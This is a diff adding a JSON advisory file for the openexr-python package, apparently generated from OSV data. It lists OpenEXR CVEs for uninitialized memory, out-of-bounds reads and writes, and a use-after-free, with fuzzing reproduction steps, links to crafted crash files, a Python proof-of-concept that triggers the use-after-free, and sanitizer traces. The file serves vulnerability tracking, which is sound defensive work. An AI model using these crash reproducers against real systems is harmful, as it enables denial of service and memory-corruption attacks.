@@ -1,0 +1,1217 @@
+{
+  "schema_version": 1,
+  "package": "openexr-python",
+  "purls": [
+    "pkg:pypi/openexr"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 17,
+  "advisories": [
+    {
+      "id": "GHSA-3h9h-qfvw-98hq",
+      "primary_id": "CVE-2025-64181",
+      "aliases": [
+        "CVE-2025-64181"
+      ],
+      "cve_ids": [
+        "CVE-2025-64181"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR Makes Use of Uninitialized Memory",
+      "details": "### Summary\nWhile fuzzing `openexr_exrcheck_fuzzer`, Valgrind reports a conditional branch depending on uninitialized data inside `generic_unpack`. This indicates a use of uninitialized memory (CWE-457). The issue is reproducible with the current OSS-Fuzz harness and a single-file PoC.\n\n### Details\n\n**Environment:**\n- Tooling: `valgrind --tool=memcheck --track-origins=yes`\n- Target: `openexr_exrcheck_fuzzer`\n- OS: Ubuntu 20.04.6 LTS focal x86_64\n- openexr version and Git-commit hash: ` openexr 3.4.2 | commit fd657e8a41e157e5841c7cc2e2a5efe094b069a1 (grafted, HEAD -> main, origin/main, origin/HEAD)`\n\nFunction: `generic_unpack`\n\nPossible root cause (based on observed symptoms):\nThe unpacker is branching on bytes in a scratch buffer that were never written because the decode step didn\u2019t fully populate it.\n- The first use flagged is in `generic_unpack()`. That function reads from the decompressed/expanded pixel buffer to scatter data into the framebuffer. A \u201cconditional jump depends on uninitialised value(s)\u201d means it\u2019s consulting bytes in that buffer before they were written.\n- Valgrind says the uninitialised value \u201cwas created by a heap allocation (malloc)\u201d, not the stack: this matches a per-tile/per-scanline decode scratch buffer allocated in `exr_decoding_run()`.\n\n**Valgrind Trace (top frames):**\n```bash\n==454== Conditional jump or move depends on uninitialised value(s)\n==454==    at 0x4539BE: generic_unpack (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x44B85F: exr_decoding_run (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x38BC5F: Imf_4_0::(anonymous namespace)::TileProcess::run_decode(_priv_exr_context_t const*, int, Imf_4_0::FrameBuffer const*, std::__1::vector<Imf_4_0::Slice, std::__1::allocator<Imf_4_0::Slice> > const&) (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x388BE1: Imf_4_0::TiledInputFile::Data::readTiles(int, int, int, int, int, int) (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x388619: Imf_4_0::TiledInputFile::readTiles(int, int, int, int, int, int) (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x353755: Imf_4_0::InputFile::Data::bufferedReadPixels(int, int) (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x352286: Imf_4_0::InputFile::readPixels(int) (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x3190FA: Imf_4_0::(anonymous namespace)::readMultiPart(Imf_4_0::MultiPartInputFile&, bool, bool) (in /out/openexr_exrcheck_fuzzer)\n==454==    by 0x314C4D: Imf_4_0::checkOpenEXRFile(char const*, unsigned long, bool, bool, bool) (in /out/openexr_exrcheck_fuzzer)\n==454==  Uninitialised value was created by a heap allocation at 0x483B7F3: malloc (in /usr/lib/x86_64-linux-gnu/valgrind/vgpreload_memcheck-amd64-linux.so)\n```\n\n### PoC\nIn the attached archive, you will find:\n- The executable used for our tests.\n- The testcase used to trigger the bug.\n\nTo observe the bug, simply run the OSS-Fuzz helper script:\n```bash\ngit clone https://github.com/google/oss-fuzz.git\ncd oss-fuzz\n\npython3 infra/helper.py build_image openexr\npython3 infra/helper.py build_fuzzers --sanitizer=none openexr\npython3 infra/helper.py shell openexr\n\napt update && apt install -y valgrind\nulimit -n 65535\nvalgrind --tool=memcheck --track-origins=yes /out/openexr_exrcheck_fuzzer /path/to/poc\n```\n\n### Impact\n- Undefined Behavior\n- Potential crash\n- Denial of Service\n\n**Credit:** Aldo Ristori\n[archive0.zip](https://github.com/user-attachments/files/23024726/archive0.zip)\n\n\n\n### Update Note:\nOther saved testcases from the fuzzing campaign trigger the same underlying bug, but with a different manifestation. So there is one root cause (missing post-decode validation / zero-init before any unpack), with different call-sites. Below there are several archives, formatted like the previous one, that reproduce the other test cases.\n\n**Other observed sinks (distinct manifestations of the same bug):**\n\n**Deep pointers path:**\ngeneric_unpack_deep_pointers (deep scanline/tiled)\n[archive1.zip](https://github.com/user-attachments/files/23024736/archive1.zip)\n\n\n**Deep sample table path:**\nunpack_sample_table (deep scanline)\n[archive2.zip](https://github.com/user-attachments/files/23024740/archive2.zip)\n\n\n**Half conversion path:**\nhalf_to_float_buffer_f16c via unpack_half_to_float_3chan_planar\n[archive3.zip](https://github.com/user-attachments/files/23024744/archive3.zip)\n\n\n**Deep compositing:**\nCompositeDeepScanLine::readPixels \u2192 ThreadPool::addTask \u2192 LineCompositeTask::execute\n[archive4.zip](https://github.com/user-attachments/files/23024746/archive4.zip)",
+      "published": "2026-04-06T17:51:11Z",
+      "modified": "2026-04-06T18:01:31.358896Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-3h9h-qfvw-98hq"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64181"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/user-attachments/files/23024726/archive0.zip"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/user-attachments/files/23024736/archive1.zip"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/user-attachments/files/23024740/archive2.zip"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/user-attachments/files/23024744/archive3.zip"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/user-attachments/files/23024746/archive4.zip"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-3h9h-qfvw-98hq",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.0"
+            },
+            {
+              "fixed": "3.3.6"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0"
+      ]
+    },
+    {
+      "id": "GHSA-4r7w-q3jg-ff43",
+      "primary_id": "CVE-2025-48072",
+      "aliases": [
+        "CVE-2025-48072"
+      ],
+      "cve_ids": [
+        "CVE-2025-48072"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR Out of Bounds Heap Read due to Bad Pointer Arithmetic in LossyDctDecoder_execute",
+      "details": "### Summary\nThe OpenEXRCore code is vulnerable to a heap-based buffer overflow during a read operation due to bad pointer math when decompressing DWAA-packed scan-line EXR files with a maliciously forged chunk.\n\n### Details\n\nIn the `LossyDctDecoder_execute` function (from `src/lib/OpenEXRCore/internal_dwa_decoder.h`, when SSE2 is enabled), the following code is used to copy data from the chunks:\n\n```cpp\n// no-op conversion to linear\nfor (int y = 8 * blocky; y < 8 * blocky + maxY; ++y)\n{\n    __m128i* restrict dst = (__m128i *) chanData[comp]->_rows[y];\n    __m128i const * restrict src = (__m128i const *)&rowBlock[comp][(y & 0x7) * 8];\n\n    for (int blockx = 0; blockx < numFullBlocksX; ++blockx)\n    {\n        _mm_storeu_si128 (dst, _mm_loadu_si128 (src)); //\n\n        src += 8 * 8; // <--- si128 pointer incremented as a uint16_t\n        dst += 8;\n    }\n}\n```\n\nThe issue arises because the `src` pointer, which is a `si128` pointer, is incremented by `8*8`, as if it were a `uint16_t`\u00a0pointer (64 * uint16_t == 128 bytes). In non-block aligned chunks (width/height not a multiple of 8), this can cause `src` to point past the boundaries of the chunk.\n\n### PoC\n\nIn order to reproduce the PoC with fidelity and avoid undefined behaviors, it is necessary to enable ASAN (and SSE2). Otherwise the out-of-bound read will not be detected until its side-effect causes a crash.\n\nNOTE: please download the `dwadecoder_crash.exr` file from the following link: \n\nhttps://github.com/ShielderSec/poc/tree/main/CVE-2025-48072\n\n1. Compile the `exrcheck` binary in a macOS or GNU/Linux machine with ASAN.\n2. Open the `dwadecoder_crash.exr` file with the following command:\n\n```\nexrcheck dwadecoder_crash.exr\n```\n\n3. Notice that `exrcheck` crashes with ASAN stack-trace.\n\n```\n==2297956==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x52500000a110 at pc 0x55e590db7bf1 bp 0x7fff948bb110 sp 0x7fff948bb108\nREAD of size 16 at 0x52500000a110 thread T0\n    #0 0x55e590db7bf0 in LossyDctDecoder_execute /root/openexr/src/lib/OpenEXRCore/internal_dwa_decoder.h:650:48\n    #1 0x55e590dae18d in DwaCompressor_uncompress /root/openexr/src/lib/OpenEXRCore/internal_dwa_compressor.h:1132:30\n    #2 0x55e590da9960 in internal_exr_undo_dwaa /root/openexr/src/lib/OpenEXRCore/internal_dwa.c:202:18\n    #3 0x55e590d42d03 in exr_uncompress_chunk /root/openexr/src/lib/OpenEXRCore/compression.c:516:14\n    #4 0x55e590dc3132 in exr_decoding_run /root/openexr/src/lib/OpenEXRCore/decoding.c:580:14\n    #5 0x55e590c7d78f in Imf_3_4::(anonymous namespace)::ScanLineProcess::run_decode(_priv_exr_context_t const*, int, Imf_3_4::FrameBuffer const*, int, int, std::vector<Imf_3_4::Slice, std::allocator<Imf_3_4::Slice>> const&) /root/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:585:23\n    #6 0x55e590c83ed7 in Imf_3_4::ScanLineInputFile::Data::readPixels(Imf_3_4::FrameBuffer const&, int, int) /root/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:499:21\n    #7 0x55e590c73c97 in Imf_3_4::ScanLineInputFile::readPixels(int, int) /root/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:306:12\n    #8 0x55e590c73c97 in Imf_3_4::InputFile::Data::readPixels(int, int) /root/openexr/src/lib/OpenEXR/ImfInputFile.cpp:446:20\n    #9 0x55e590c1f92f in Imf_3_4::InputFile::readPixels(int) /root/openexr/src/lib/OpenEXR/ImfInputFile.cpp:228:12\n    #10 0x55e590c1f92f in Imf_3_4::InputPart::readPixels(int) /root/openexr/src/lib/OpenEXR/ImfInputPart.cpp:70:11\n    #11 0x55e590c1f92f in bool Imf_3_4::(anonymous namespace)::readScanline<Imf_3_4::InputPart>(Imf_3_4::InputPart&, bool, bool) /root/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:239:20\n    #12 0x55e590c1f92f in Imf_3_4::(anonymous namespace)::readMultiPart(Imf_3_4::MultiPartInputFile&, bool, bool) /root/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:879:28\n    #13 0x55e590c155af in bool Imf_3_4::(anonymous namespace)::runChecks<char const*>(char const*&, bool, bool) /root/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1132:21\n    #14 0x55e590c155af in Imf_3_4::checkOpenEXRFile(char const*, bool, bool, bool) /root/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1796:19\n    #15 0x55e590ba5abe in exrCheck(char const*, bool, bool, bool, bool) /root/openexr/src/bin/exrcheck/main.cpp:96:16\n    #16 0x55e590ba6fbe in main /root/openexr/src/bin/exrcheck/main.cpp:164:29\n    #17 0x7f4259e2a1c9 in __libc_start_call_main csu/../sysdeps/npthttps://gitlab.com/qemu-project/qemu/-/issuesl/libc_start_call_main.h:58:16\n    #18 0x7f4259e2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #19 0x55e590ac67d4 in _start (/root/openexr/_build_afl_asan/bin/exrcheck+0x1d87d4) (BuildId: 49c2658b2f9ddef9)\n\n0x52500000a110 is located 752 bytes after 9504-byte region [0x525000007900,0x525000009e20)\nallocated by thread T0 here:\n    #0 0x55e590b61623 in malloc (/root/openexr/_build_afl_asan/bin/exrcheck+0x273623) (BuildId: 49c2658b2f9ddef9)\n    #1 0x55e590db11b1 in LossyDctDecoder_execute /root/openexr/src/lib/OpenEXRCore/internal_dwa_decoder.h:324:22\n    #2 0x55e590dae18d in DwaCompressor_uncompress /root/openexr/src/lib/OpenEXRCore/internal_dwa_compressor.h:1132:30\n    #3 0x55e590da9960 in internal_exr_undo_dwaa /root/openexr/src/lib/OpenEXRCore/internal_dwa.c:202:18\n    #4 0x55e590d42d03 in exr_uncompress_chunk /root/openexr/src/lib/OpenEXRCore/compression.c:516:14\n```\n\n### Impact\nAn attacker could crash the application and in some scenarios also leak data, such as sensitive information or memory addresses that might be used to bypass exploitation mitigations like ASLR.",
+      "published": "2025-07-31T19:20:05Z",
+      "modified": "2025-08-01T13:29:02Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-4r7w-q3jg-ff43"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48072"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/2d09449427b13a05f7c31a98ab2c4347c23db361"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.3.3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ShielderSec/poc/tree/main/CVE-2025-48072"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-4r7w-q3jg-ff43",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.2"
+            },
+            {
+              "fixed": "3.3.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.3.2"
+      ],
+      "affected_conda_versions": [
+        "3.3.2"
+      ]
+    },
+    {
+      "id": "GHSA-57cw-j6vp-2p9m",
+      "primary_id": "CVE-2025-64183",
+      "aliases": [
+        "CVE-2025-64183"
+      ],
+      "cve_ids": [
+        "CVE-2025-64183"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR has use after free in PyObject_StealAttrString",
+      "details": "### Summary\nThere is a use-after-free in PyObject_StealAttrString of pyOpenEXR_old.cpp.\n\nThis bug was found with [ZeroPath](https://zeropath.com/?utm_source=joshua.hu).\n\n### Details\n\nThe legacy adapter defines PyObject_StealAttrString that calls PyObject_GetAttrString to obtain a new reference, immediately decrefs it, and returns the pointer. Callers then pass this dangling pointer to APIs like PyLong_AsLong/PyFloat_AsDouble, resulting in a use-after-free. This is invoked in multiple places (e.g., reading PixelType.v, Box2i, V2f, etc.).\n\nhttps://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115\n\nhttps://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387\n\nhttps://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286\n\n### PoC\n\n```py\nimport OpenEXR, Imath\n\n# Any small EXR will do - use one from OpenEXR test images or any project file\npath = \"any_small.exr\"\n\n# Property returns a fresh temporary int subclass, so the buggy helper\n# decrefs it to zero before passing it to PyLong_AsLong => UAF.\nclass FreshInt(int):\n    def __new__(cls, v):\n        return int.__new__(cls, v)\n    def __del__(self):\n        # stir the heap to make the UAF obvious under PYTHONMALLOC=debug\n        _ = bytearray(1_000_000)\n\nclass PixelTypeProxy:\n    @property\n    def v(self):\n        return FreshInt(Imath.PixelType.FLOAT)  # any small value is fine\n\nf = OpenEXR.InputFile(path)\n# channel() forces the wrapper to read pixel_type.v using the buggy helper\n# which returns a dangling pointer\nprint(\"About to trigger UAF...\")\nf.channel(\"R\", pixel_type=PixelTypeProxy())\nprint(\"If you get here without a crash, try again with AddressSanitizer.\")\n```\nrunning\n\n```shell\nPYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py\n```\n\n```\nAbout to trigger UAF...\nFatal Python error: Segmentation fault\n\nCurrent thread 0x00000001f209a140 (most recent call first):\n  File \"/private/tmp/i/pt.py\", line 24 in <module>\n\nCurrent thread's C stack trace (most recent call first):\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at _Py_DumpStack+0x44 [0x1058c00f8]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at faulthandler_dump_c_stack+0x58 [0x1058d2f3c]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at faulthandler_fatal_error+0x160 [0x1058d2e00]\n  Binary file \"/usr/lib/system/libsystem_platform.dylib\", at _sigtramp+0x38 [0x1841796a4]\n  Binary file \"/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so\", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]\n  Binary file \"/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so\", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at method_vectorcall_VARARGS_KEYWORDS+0x94 [0x1057032bc]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at PyObject_Vectorcall+0x58 [0x1056f5044]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at _PyEval_EvalFrameDefault+0x9cac [0x1058312d8]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at PyEval_EvalCode+0xf8 [0x105827130]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at run_mod+0xac [0x1058a2b60]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at pyrun_file+0xa4 [0x1058a123c]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at _PyRun_SimpleFileObject+0x100 [0x1058a07c0]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at _PyRun_AnyFileObject+0x50 [0x1058a0424]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at pymain_run_file_obj+0xa4 [0x1058cfcd8]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at pymain_run_file+0x48 [0x1058cfa20]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at Py_RunMain+0x354 [0x1058cef60]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at pymain_main+0xe8 [0x1058cf3f8]\n  Binary file \"/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python\", at Py_BytesMain+0x28 [0x1058cf494]\n  Binary file \"/usr/lib/dyld\", at start+0x17bc [0x183d9eb98]\n\nExtension modules: numpy._core._multiarray_umath, numpy.linalg._umath_linalg (total: 2)\nSegmentation fault: 11     PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py\n```\n\n### Impact\n\nCompletely depends on the context. Typical memory stuff related to UAFs.",
+      "published": "2026-04-06T17:51:23Z",
+      "modified": "2026-04-06T18:01:15.463030Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64183"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-57cw-j6vp-2p9m",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.2.0"
+            },
+            {
+              "fixed": "3.2.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.2.3",
+        "3.2.4"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0"
+      ]
+    },
+    {
+      "id": "GHSA-588r-cr5c-w6hf",
+      "primary_id": "CVE-2026-34588",
+      "aliases": [
+        "CVE-2026-34588"
+      ],
+      "cve_ids": [
+        "CVE-2026-34588"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR has a signed 32-bit Overflow in PIZ Decoder Leads to OOB Read/Write",
+      "details": "## Summary\n\n`internal_exr_undo_piz()` advances the working wavelet pointer with signed 32-bit arithmetic:\n\n```c\nwavbuf += nx * ny * wcount;\n```\n\nBecause `nx`, `ny`, and `wcount` are `int`, a crafted EXR file can make this product overflow and wrap. The next channel then decodes from an incorrect address. The wavelet decode path operates in place, so this yields both out-of-bounds reads and out-of-bounds writes.\n\nTested on commit 7820b7e1b93405ba1d551c43a945018226b75bc5\n\n## Technical Details\n\nThe vulnerable decode path is:\n\n1. `internal_exr_undo_piz()` sets `wavbuf = decode->scratch_buffer_1`.\n2. For each channel, it calls `wav_2D_decode (wavbuf + j, ...)`.\n3. It then advances `wavbuf` with `wavbuf += nx * ny * wcount`.\n\nThe overflow happens in step 3. Once `wavbuf` is wrapped, the next channel's wavelet decode runs on the wrong address.\n\nIn the 14-bit wavelet path, `wdec14_4()` first reads:\n\n- `*px`\n- `*p10`\n- `*p01`\n- `*p11`\n\nand then writes back to the same locations:\n\n- `*px  = ...`\n- `*p01 = ...`\n- `*p10 = ...`\n- `*p11 = ...`\n\nAs a result, the bug is not just a crash-only invalid read. It is an out-of-bounds read/write condition.\n\n## Reproduction\n\n[piz_scanline_redzone.zip](https://github.com/user-attachments/files/26318946/piz_scanline_redzone.zip)\n\nBuild `exrcheck` with ASAN and run:\n\n```\n\u276f ./build-asan/bin/exrcheck /tmp/piz_scanline_redzone.exr\n file /tmp/piz_scanline_redzone.exr /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c:373:19: runtime error: signed integer overflow: 134217724 * 32 cannot be represented in type 'int'\n=================================================================\n==1711239==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7bedc3934700 at pc 0x7bf1f100f498 bp 0x7ffe032d8f00 sp 0x7ffe032d8ef0\nREAD of size 2 at 0x7bedc3934700 thread T0\n    #0 0x7bf1f100f497 in wdec14_4 /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c:148\n    #1 0x7bf1f100f497 in wav_2D_decode /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c:403\n    #2 0x7bf1f100f497 in internal_exr_undo_piz /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c:727\n    #3 0x7bf1f115b038 in exr_uncompress_chunk /home/pop/sec/openexr/src/lib/OpenEXRCore/compression.c:546\n    #4 0x7bf1f1161168 in exr_decoding_run /home/pop/sec/openexr/src/lib/OpenEXRCore/decoding.c:580\n    #5 0x7bf1f2a71add in run_decode /home/pop/sec/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:586\n    #6 0x7bf1f2a83dc4 in Imf_4_0::ScanLineInputFile::Data::readPixels(Imf_4_0::FrameBuffer const&, int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:500\n    #7 0x7bf1f28c6a81 in Imf_4_0::InputFile::Data::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfInputFile.cpp:458\n    #8 0x7bf1f3bfe2dc in readScanline<Imf_4_0::InputPart> /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:239\n    #9 0x7bf1f3c05b04 in readMultiPart /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:905\n    #10 0x7bf1f3c126fd in runChecks<char const*> /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1171\n    #11 0x7bf1f3c146b9 in Imf_4_0::checkOpenEXRFile(char const*, bool, bool, bool) /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1835\n    #12 0x5d9675fce8f8 in exrCheck(char const*, bool, bool, bool, bool) /home/pop/sec/openexr/src/bin/exrcheck/main.cpp:96\n    #13 0x5d9675fcb2b1 in main /home/pop/sec/openexr/src/bin/exrcheck/main.cpp:164\n    #14 0x7bf1efe2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #15 0x7bf1efe2a28a in __libc_start_main_impl ../csu/libc-start.c:360\n    #16 0x5d9675fcc844 in _start (/home/pop/sec/openexr/build-asan/bin/exrcheck+0xe844) (BuildId: 087c972343a5372940c42c0a2e7bce4a84288aec)\n\n0x7bedc3934700 is located 256 bytes before 8590720784-byte region [0x7bedc3934800,0x7befc39f4710)\nallocated by thread T0 here:\n    #0 0x7bf1f40fd9c7 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69\n    #1 0x7bf1f115883e in internal_decode_alloc_buffer /home/pop/sec/openexr/src/lib/OpenEXRCore/coding.c:256\n    #2 0x7bf1f100da97 in internal_exr_undo_piz /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c:643\n    #3 0x7bf1f115b038 in exr_uncompress_chunk /home/pop/sec/openexr/src/lib/OpenEXRCore/compression.c:546\n    #4 0x7bf1f1161168 in exr_decoding_run /home/pop/sec/openexr/src/lib/OpenEXRCore/decoding.c:580\n    #5 0x7bf1f2a71add in run_decode /home/pop/sec/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:586\n    #6 0x7bf1f2a83dc4 in Imf_4_0::ScanLineInputFile::Data::readPixels(Imf_4_0::FrameBuffer const&, int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfScanLineInputFile.cpp:500\n    #7 0x7bf1f28c6a81 in Imf_4_0::InputFile::Data::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfInputFile.cpp:458\n    #8 0x7bf1f3bfe2dc in readScanline<Imf_4_0::InputPart> /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:239\n    #9 0x7bf1f3c05b04 in readMultiPart /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:905\n    #10 0x7bf1f3c126fd in runChecks<char const*> /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1171\n    #11 0x7bf1f3c146b9 in Imf_4_0::checkOpenEXRFile(char const*, bool, bool, bool) /home/pop/sec/openexr/src/lib/OpenEXRUtil/ImfCheckFile.cpp:1835\n    #12 0x5d9675fce8f8 in exrCheck(char const*, bool, bool, bool, bool) /home/pop/sec/openexr/src/bin/exrcheck/main.cpp:96\n    #13 0x5d9675fcb2b1 in main /home/pop/sec/openexr/src/bin/exrcheck/main.cpp:164\n    #14 0x7bf1efe2a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #15 0x7bf1efe2a28a in __libc_start_main_impl ../csu/libc-start.c:360\n    #16 0x5d9675fcc844 in _start 